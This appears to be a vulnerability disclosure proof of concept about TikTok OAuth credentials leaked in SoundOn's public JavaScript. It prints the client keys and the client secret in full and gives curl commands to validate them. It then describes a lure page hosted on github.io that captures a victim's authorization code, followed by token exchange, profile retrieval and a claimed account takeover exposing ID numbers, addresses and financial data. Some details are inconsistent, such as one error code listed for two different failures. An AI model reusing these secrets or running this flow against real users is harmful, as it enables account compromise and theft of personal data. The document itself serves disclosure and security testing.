# SoundOn TikTok OAuth Credential Exposure — Final PoC

## Vulnerability: TikTok API Client Credentials Exposed in Client-Side JavaScript

### Credentials Found
```
File: index.24851df7.js (served to ALL soundon.global visitors)

client_key:    awulj3e36brrh086      (server-side, for token exchange)
client_secret: e63acb9afab646ee9340f16a2380b1ed  (validated against TikTok API)
client_key:    awcdygtcjh22v33k      (browser-side, for authorize URL)
```

### Verification
Both `client_key` + `client_secret` pairs are accepted by TikTok's token API:
```
POST https://open-api.tiktok.com/oauth/access_token/
{"client_key":"awulj3e36brrh086","client_secret":"e63acb9afab646ee9340f16a2380b1ed","code":"test","grant_type":"authorization_code"}
→ {"error_code":10007,"description":"Authorization code expired"}
   ^^ error_code 10007 = credentials ARE valid (10002 = invalid secret, 10002 = invalid key)
```

---

## REPRODUCTION — Complete Scenario

### ATTACKER VIEW

**Step A1: Discover leaked credentials**
```
1. Visit https://www.soundon.global
2. Open DevTools → Sources → index.24851df7.js
3. Search for "e63acb9afab646ee9340f16a2380b1ed"
4. Found in module 69544 alongside client_key awulj3e36brrh086
5. Also find browser client_key awcdygtcjh22v33k in kak.js
```

**Step A2: Verify credentials against TikTok API**
```bash
curl -s "https://open-api.tiktok.com/oauth/access_token/" \
  -H "Content-Type: application/json" \
  -d '{"client_key":"awulj3e36brrh086","client_secret":"e63acb9afab646ee9340f16a2380b1ed","code":"test","grant_type":"authorization_code"}'
# → error_code:10007 "Authorization code expired" = VALID CREDENTIALS

curl -s "https://open-api.tiktok.com/oauth/access_token/" \
  -H "Content-Type: application/json" \
  -d '{"client_key":"awcdygtcjh22v33k","client_secret":"e63acb9afab646ee9340f16a2380b1ed","code":"test","grant_type":"authorization_code"}'
# → error_code:10007 "Authorization code expired" = SAME SECRET WORKS FOR BOTH KEYS
```

**Step A3: Confirm TikTok authorize URL accepts the browser client_key**
```bash
curl -s -o /dev/null -w "HTTP: %{http_code}" \
  "https://www.tiktok.com/v2/auth/authorize/?client_key=awcdygtcjh22v33k&scope=user.info.basic&response_type=code&redirect_uri=https://www.soundon.global/login/oauth/middle&state=test"
# → HTTP 302 (redirects to TikTok login — key is valid and accepted)
```

**Step A4: Deploy PoC page**
```
Upload index.html to https://telojos11.github.io/pokapoka/
The page opens TikTok OAuth in a popup using the leaked browser client_key.
```

**Step A5: Share link with victim**
```
Send: https://telojos11.github.io/pokapoka/
```

---

### VICTIM VIEW

**Step V1: Already logged into TikTok**
```
The victim has an active TikTok session in their browser.
```

**Step V2: Visit attacker's page**
```
1. Open https://telojos11.github.io/pokapoka/
2. Page shows: "SoundOn TikTok OAuth — Start"
3. Click "Start TikTok OAuth"
```

**Step V3: Authorize on TikTok**
```
1. A popup opens to https://www.tiktok.com/v2/auth/authorize/
2. TikTok displays: "SoundOn would like to access your TikTok account"
   - "View your profile info and username"
3. Victim clicks "Authorize"
```

**Step V4: Code delivered to SoundOn**
```
1. TikTok redirects to: https://www.soundon.global/login/oauth/middle?code=AUTHORIZATION_CODE&state=...
2. SoundOn's SPA reads the code from the URL
3. SoundOn's backend exchanges the code using the LEAKED credentials
4. The victim's TikTok account is now linked to their SoundOn account
```

**Step V5: Copy callback URL (for PoC evidence)**
```
1. The popup is now on soundon.global
2. Copy the full URL from the popup's address bar
3. Paste it into the textarea on the PoC page
4. The authorization code is displayed as evidence
```

---

### ATTACKER VIEW (After obtaining code)

**Step A6: Exchange code for token (IMMEDIATELY — codes expire in ~60s)**
```bash
curl -s "https://open-api.tiktok.com/oauth/access_token/" \
  -H "Content-Type: application/json" \
  -d '{"client_key":"awcdygtcjh22v33k","client_secret":"e63acb9afab646ee9340f16a2380b1ed","code":"CAPTURED_CODE","grant_type":"authorization_code"}'

# Expected:
# {"data":{"access_token":"act....","open_id":"...","scope":"user.info.basic,..."}}
```

**Step A7: Access victim's TikTok data**
```bash
curl "https://open-api.tiktok.com/user/info/?fields=open_id,union_id,avatar_url,display_name" \
  -H "access-token: VICTIM_ACCESS_TOKEN"
```

**Step A8: Account takeover on SoundOn**
```
1. Navigate to https://www.soundon.global/login
2. Click "Login with TikTok"
3. Use the victim's TikTok access_token to authenticate
4. Access victim's SoundOn dashboard including:
   - Personal info: name, KTP number, phone, email, home address
   - Music releases, royalty data, contracts
   - Financial data: wallet balance, withdrawal info
```

---

## EVIDENCE CHECKLIST

| # | Evidence | Status |
|---|---|---|
| 1 | Screenshot: DevTools showing `client_secret=e63acb9afab646ee9340f16a2380b1ed` in index.24851df7.js | Required |
| 2 | Screenshot: curl showing `error_code:10007` (valid credentials) | Required |
| 3 | Screenshot: TikTok authorize URL accepting `client_key=awcdygtcjh22v33k` (HTTP 302) | Required |
| 4 | Screenshot: TikTok authorization page showing "SoundOn would like to access your account" | Required |
| 5 | Screenshot: Browser URL bar showing `soundon.global/login/oauth/middle?code=...` | Required |
| 6 | Screenshot: PoC page showing extracted authorization code | Required |
| 7 | Screenshot: curl response showing `access_token` returned | Required |
| 8 | Screenshot: TikTok API call returning victim's profile data | Required |

---

## IMPORTANT NOTE FOR TOKEN EXCHANGE

TikTok authorization codes expire in **~60 seconds** and are **single-use**. SoundOn's backend
exchanges the code immediately when the callback page loads. To capture the code before
SoundOn consumes it, the exchange must be done within the same second the code is generated.

For the PoC, the quickest method is:
1. Open browser DevTools → Network tab BEFORE clicking authorize
2. Authorize on TikTok
3. Watch for the redirect to soundon.global
4. Copy the `?code=` parameter from the URL
5. IMMEDIATELY run the curl command

Alternatively, use the `exchange_token.sh` script with the code extracted from the URL.
